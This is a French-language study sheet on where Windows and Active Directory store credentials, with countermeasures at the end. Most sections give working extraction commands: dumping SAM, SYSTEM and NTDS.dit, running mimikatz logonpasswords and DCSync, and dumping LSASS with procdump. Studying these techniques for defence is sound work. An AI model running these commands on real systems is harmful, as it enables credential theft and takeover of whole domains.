# AD: Stored credentials
Fichiers Critiques : SAM, SYSTEM, SECURITY & NTDS.dit
|  Fichier | Emplacement | Contenu | Techniques d'extraction  |
| --- | --- | --- | --- |
|  SAM | C:\Windows\System32\config\SAM | Stocke les hashs NTLM des comptes locaux | samdump2, mimikatz, secretsdump.py  |
|  SYSTEM | C:\Windows\System32\config\SYSTEM | Contient la clé de chiffrement pour décrypter SAM | reg save, secretsdump.py -system SYSTEM -sam SAM LOCAL  |
|  SECURITY | C:\Windows\System32\config\SECURITY | Stocke les secrets LSA (mots de passe de services, clés DPAPI) + cred des users de domaine | mimikatz lsadump::secrets, secretsdump.py -security SECURITY LOCAL  |
|  NTDS.dit (DC) | C:\Windows\NTDS\NTDS.dit | Base de données Active Directory, contient les hashs NTLM & Kerberos de tout le domaine | ntdsutil, secretsdump.py -just-dc, mimikatz lsadump::dcsync  

## Techniques d'extraction Machine Membre d'un Domaine :
- Dump de SAM et SYSTEM pour obtenir les hash NTLM locaux :
  ```powershell
  reg save HKLM\SAM C:\temp\SAM.hive
  reg save HKLM\SYSTEM C:\temp\SYSTEM.hive
  ```
Extraction avec secretsdump.py :
  ```bash
  secretsdump.py -sam SAM -system SYSTEM LOCAL
  ```
- Extraction des secrets LSA :
  ```
  mimikatz
  lsadump::secrets
  ```
Contrôleur de Domaine (DC) :
- Dump de NTDS.dit :
  ```powershell
  ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ntds" quit quit
  ```
- Extraction des hash NTLM/Kerberos via secretsdump.py :
  ```bash
  secretsdump.py -just-dc DOMAIN\Administrator@DC-IP
  ```
- Attaque DCSync pour récupérer les hash sans accès direct au serveur :
  ```
  mimikatz
  lsadump::dcsync /domain:MONDOMAINE /user:Administrateur
  ```
2 Stockage dans la Base de Registre
| Clé Registre | Emplacement | Contenu | Technique d'extraction |
| :--: | :--: | :--: | :--: |
| AutoLogon | HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon | Nom d'utilisateur et mot de passe en clair si AutoLogon activé | reg query, mimikatz sekurlsa::logonpasswords |
| MSCache | HKLM\SECURITY\Cache | Hashs NTLM en cache pour connexions horsligne | mimikatz lsadump::cache, secretsdump.py security SECURITY LOCAL |
| RDP Credentials | HKCU\Software\Microsoft\Terminal Server Client\Servers | Identifiants stockés pour sessions RDP | reg query, mimikatz sekurlsa::credman
##Techniques d'extraction
- Lister les credentials RDP enregistrés :
  ```powershell
  reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"
  ```
- Dump des credentials Windows Vault :
  ```
  mimikatz
  vault::list
  ```
# 3 LSASS (Local Security Authority Subsystem Service)
## Emplacement :
- En mémoire uniquement, accessible par dump du processus.
## Utilisation :
- Contient les credentials en clair ou sous forme de hash des utilisateurs connectés.
- Peut être protégé par Credential Guard sur Windows 10/11.
## Techniques d'extraction :
- Dump de LSASS avec Mimikatz (privilèges SYSTEM requis) :
  ```
  mimikatz
  sekurlsa::logonpasswords
  ```
- Dump manuel et analyse ultérieure :
  ```powershell
  procdump.exe -accepteula -ma lsass.exe lsass.dmp
  ```
  Puis extraction avec Mimikatz :
  ```
  mimikatz
  sekurlsa::minidump lsass.dmp
  sekurlsa::logonpasswords
  ```
# Windows Credential Manager (Vault)
## Emplacement :
- C:\Users\%USERNAME%\AppData\Local\Microsoft\Credentials\
- C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Credentials\
## Contenu :
- Stocke des identifiants Windows, RDP, Outlook, réseau.
## Techniques d'extraction :
- Lister les credentials enregistrés :
  ```powershell
  cmdkey /list
  ```
- Extraire les credentials avec Mimikatz :
  ```
  mimikatz
  vault::list
  ```
# 5 Scheduled Tasks & Services
## Emplacement :
- C:\Windows\System32\Tasks\
- HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\
## Utilisation :
- Contient des credentials pour exécuter des tâches planifiées avec un compte spécifique.
## Techniques d'extraction :
- Lister les tâches planifiées avec credentials :
  ```powershell
  schtasks /query /fo LIST /v
  ```
- Lister les services avec leurs credentials :
  ```powershell
  wmic service get name, displayname,startmode
  ```
Résumé des Attaques & Défenses
| Attaque | Objectif | Outils | Contre-mesures |
| :-- | :-- | :-- | :-- |
| Dump SAM & SYSTEM | Récupérer les hash NTLM | samdump2, secretsdump.py | Restriction d'accès, BitLocker |
| Dump LSASS | Credentials en clair | mimikatz, procdump | Credential Guard |
| Dump NTDS.dit | Hashs NTLM/Kerberos de tout le domaine | secretsdump.py -just-dc | Audit des DC, restriction d'accès |
| DCSync | Exfiltrer les hash NTLM des utilisateurs | mimikatz lsadump::dcsync | Restreindre Replicating Directory Changes |
# Conclusion
La sécurité des credentials sous Windows repose sur l'isolation des fichiers système, la protection des processus sensibles et le chiffrement. La meilleure défense est de limiter les privilèges, activer Credential Guard et surveiller les accès aux fichiers sensibles.
# Résumé des Stockages Locaux des Credentials d'un Utilisateur de Domaine
| Type de Machine | Fichier | Contenu Stocké | Méthode d'Extraction |
| :--: | :--: | :--: | :--: |
| Contrôleur de Domaine | NTDS.dit | Hash NTLM/Kerberos de tous les comptes du domaine | secretsdump.py -just-dc, mimikatz lsadump::dcsync |
| Machine Membre du Domaine | SECURITY | Hash NTLM/MScache des derniers utilisateurs du domaine connectés | mimikatz lsadump::cache, secretsdump.py -security |
| Mémoire Vive (LSASS) | lsass.exe | Credentials en clair ou sous forme de hash | mimikatz sekurlsa::logonpasswords, procdump |
## Contre-mesures
- Sur un DC :
  - Restreindre l'accès à NTDS.dit (utiliser le chiffrement EFS).
  - Activer LAPS pour éviter les mots de passe locaux fixes.
  - Activer Audit & Logging des accès aux comptes sensibles.
  - Restreindre DCSync aux seuls DC.
- Sur une machine membre du domaine :
  - Désactiver le cache des hash NTLM (HKLM\SECURITY\Cache).
  - Empêcher l'extraction de LSASS avec Credential Guard.
  - Surveiller l'accès aux fichiers SECURITY et SYSTEM.
## Conclusion
- NTDS.dit sur un DC contient tous les identifiants du domaine.
- SECURITY sur un PC membre du domaine peut stocker les hashs NTLM/MScache des derniers utilisateurs.
- LSASS en mémoire contient les credentials tant qu'un utilisateur est connecté.
La compromission de ces fichiers peut donner accès à tous les comptes du domaine, d'où la nécessité d'une protection renforcée.
